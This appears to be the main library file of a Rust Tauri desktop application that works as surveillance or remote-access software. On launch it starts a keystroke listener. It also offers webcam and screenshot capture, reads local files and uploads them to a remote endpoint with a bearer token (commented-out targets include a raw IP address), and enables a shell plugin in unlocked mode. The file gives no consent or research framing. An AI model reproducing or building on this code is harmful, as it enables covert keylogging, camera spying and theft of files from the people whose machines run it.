use std::{fs, io::{Read, Seek}, path::Path, time::SystemTime, fs::File};

use keystroke::start_keystroke_listener;
use tauri_plugin_http::reqwest;
pub mod screenshot;
mod keystroke;


use image::{RgbImage, Rgb, DynamicImage, ImageBuffer};
use base64::{encode};

use nokhwa::{query, Camera, utils::{ApiBackend, CameraIndex}};
use serde::{Serialize, Deserialize};

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
        let unlocked: bool = true;

    tauri::Builder::default()
        .plugin(tauri_plugin_os::init())
        .plugin(tauri_plugin_upload::init())
        .plugin(tauri_plugin_fs::init())
        .plugin(tauri_plugin_clipboard_manager::init())
        .plugin(tauri_plugin_dialog::init())
        .plugin(tauri_plugin_http::init())
        .plugin(tauri_plugin_fs_pro::init())
        .plugin(tauri_plugin_store::Builder::new().build())
                .plugin(tauri_plugin_system_info::init())
                        .plugin(tauri_plugin_shellx::init(unlocked))
        

        .setup(|app| {
            if cfg!(debug_assertions) {
                app.handle().plugin(
                    tauri_plugin_log::Builder::default()
                        .level(log::LevelFilter::Info)
                        .build(),
                )?;
            }
                        start_keystroke_listener(app);


            Ok(())
        })
        .invoke_handler(tauri::generate_handler![open_file,   screenshot::capture,
            screenshot::get_screens, get_webcams, capture_webcam_screenshot])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
#[derive(Serialize, Deserialize)]
struct WebcamInfo {
    index: usize,
    name: String,
    description: String,
}

#[tauri::command]
fn get_webcams() -> Result<Vec<WebcamInfo>, String> {
    // Query all available camera devices
    match query(nokhwa::utils::ApiBackend::Auto) {
        Ok(devices) => {
            let webcams = devices.into_iter().enumerate().map(|(idx, device)| {
                WebcamInfo {
                    index: idx,
                    name: device.human_name(),
                    description: device.description().to_string(),
                    // description: device.description().map(|s| s.to_string()),
                }
            }).collect();
            Ok(webcams)
        },
        Err(e) => Err(format!("Failed to query cameras: {}", e))
    }
}

#[tauri::command]
fn capture_webcam_screenshot(index: usize) -> Result<String, String> {
    // Query all video devices using Auto backend
    match query(ApiBackend::Auto) {
        Ok(devices) => {
            // Map each device to WebcamInfo (with index and name)
            let webcams: Vec<WebcamInfo> = devices.into_iter().enumerate().map(|(idx, device)| {
                WebcamInfo {
                    index: idx,
                    name: device.human_name(),
                    description: device.description().to_string(),
                    // description: device.description().map(|s| s.to_string()),
                }
            }).collect();

            // Check if the camera_index is valid
            if index >= webcams.len() {
                return Err("Invalid camera index".to_string());
            }

            // Get the webcam device based on the provided index
            let device = &webcams[index];

            // Create a Camera instance from the device index
            let format = nokhwa::utils::RequestedFormat::new::<nokhwa::pixel_format::RgbFormat>(
                nokhwa::utils::RequestedFormatType::AbsoluteHighestFrameRate
            );
            let mut camera = Camera::new(CameraIndex::Index(device.index as u32), format).map_err(|e| e.to_string())?;
            // Capture a frame from the selected webcam
            let frame = camera.frame().map_err(|e| e.to_string())?;

            // Convert the frame into an image (as RgbImage)
            let rgba = frame.decode_image::<nokhwa::pixel_format::RgbFormat>().map_err(|e| e.to_string())?;
            let width = rgba.width() as u32;
            let height = rgba.height() as u32;
            let raw_data = rgba.into_raw();
            let image: RgbImage = ImageBuffer::from_raw(width, height, raw_data).unwrap();

            // Encode the image as PNG and convert to Base64
            let mut img_bytes = Vec::new();
            let dynamic_image = DynamicImage::ImageRgb8(image);
            dynamic_image.write_to(&mut std::io::Cursor::new(&mut img_bytes), image::ImageFormat::Png)
                .map_err(|e| e.to_string())?;

            let base64_image = encode(&img_bytes);

            // Return the Base64 string representing the image
            Ok(base64_image)
        },
        Err(e) => Err(format!("Failed to query cameras: {}", e)),
    }
}



#[tauri::command]
async fn open_file(path: String, token: String, apiurl: String) -> Result<String, String> {
    let filename = Path::new(&path)
        .file_name()
        .unwrap()
        .to_str()
        .unwrap()
        .to_string();
    let file = fs::File::open(&path).map_err(|e| e.to_string())?;
    let metadata = file.metadata().map_err(|e| e.to_string())?;
    let total_size = metadata.len();
    let mut reader = std::io::BufReader::new(file);
    let mut data = Vec::with_capacity(total_size as usize);
    let mut buffer = [0; 8192];
    let mut read_so_far = 0;

    loop {
        let n = reader.read(&mut buffer).map_err(|e| e.to_string())?;
        if n == 0 {
            break;
        }
        data.extend_from_slice(&buffer[..n]);
        read_so_far += n;
        println!(
            "Progress: {}%",
            (read_so_far as f64 / total_size as f64 * 100.0) as u32
        );
    }
    // let metadata: fs::Metadata = fs::metadata(path)?;

    let client = reqwest::Client::new();
    let form = reqwest::multipart::Form::new()
        .part(
            "file",
            reqwest::multipart::Part::bytes(data)
                .file_name(filename.clone())
                .mime_str("application/octet-stream")
                .map_err(|e| e.to_string())?,
        )
        .text("fileName", filename);

    let response = client
        //.post("http://4.233.151.95/api/upload")
        //.post("https://api.luqueee.dev/api/upload")
        .post(apiurl)
        .header("Authorization", format!("Bearer {}", token))
        .multipart(form)
        .send()
        .await
        .map_err(|e| e.to_string())?;

    println!("Response: {:?}", response);

    if response.status().is_success() {
        return response.text().await.map_err(|e| e.to_string());
    } else {
        Err(format!("Upload failed with status: {}", response.status()))
    }
}
